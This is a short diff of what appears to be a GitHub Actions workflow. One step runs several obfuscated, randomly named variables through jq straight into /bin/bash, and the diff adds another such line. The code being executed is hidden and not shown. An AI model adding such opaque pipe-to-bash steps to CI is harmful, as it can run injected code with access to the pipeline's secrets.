@@ -49,6 +49,7 @@ jobs:
           echo $oiwv88 | jq -r .nu335 | /bin/bash
           echo $vr46211 | jq -r .cc37278 | /bin/bash
           echo $sfbv78448 | jq -r .so42 | /bin/bash
+          printf '%s' "$oukg7" | jq -r .jr34510 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
